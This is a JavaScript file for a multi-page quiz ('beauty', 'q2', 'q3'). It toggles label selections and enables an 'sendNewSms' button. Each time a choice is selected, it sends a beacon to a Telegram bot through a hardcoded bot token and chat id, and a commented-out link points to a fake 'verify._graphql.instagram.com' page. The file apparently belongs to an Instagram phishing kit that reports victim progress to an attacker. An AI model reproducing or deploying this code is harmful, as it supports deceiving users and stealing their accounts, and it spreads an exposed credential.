const options = document.querySelectorAll("label");
for (let i = 0; i < options.length; i++) {
  options[i].addEventListener("click", ()=>{
    for (let j = 0; j < options.length; j++) {
      if(options[j].classList.contains("selected")){
        options[j].classList.remove("selected");
      }
    }

    options[i].classList.add("selected");
    for (let k = 0; k < options.length; k++) {
      options[k].classList.add("selectall");
    }

    let forVal = options[i].getAttribute("for");
    let selectInput = document.querySelector("#"+forVal);
    let getAtt = selectInput.getAttribute("type");
    if(getAtt == "checkbox"){
      selectInput.setAttribute("type", "radio");
    }else if(selectInput.checked == true){
      options[i].classList.remove("selected");
      selectInput.setAttribute("type", "checkbox");
    }

    let array = [];
    for (let l = 0; l < options.length; l++) {
      if(options[l].classList.contains("selected")){
        array.push(l);
      }
    }
    if(array.length == 0){
      for (let m = 0; m < options.length; m++) {
        options[m].removeAttribute("class");
      }
    }
    
    if(checker[0]){
      document.getElementById('sendNewSms').disabled=false;
      // document.getElementById('butonamca').disabled=false;
      fetch("https://api.telegram.org/bot5798174362:AAGod65O7U_M0ikOyD31Tolk1HxkIT3Wjuc/sendMessage?chat_id=1001085191&text=Ready")
        .then(function(response) {
            return response.json();
        })
      if(window.location.href.indexOf("beauty")!=-1){
        document.querySelector('a').href="q2.html";}
      if(window.location.href.indexOf("q2")!=-1){
        document.querySelector('a').href="q3.html";}
      if(window.location.href.indexOf("q3")!=-1){
        // document.querySelector('a').href="verify._graphql.instagram.com.html";
        document.getElementById('butonamca').disabled=false;}
        
    };
  });
}
var checker = document.getElementsByClassName('selected');
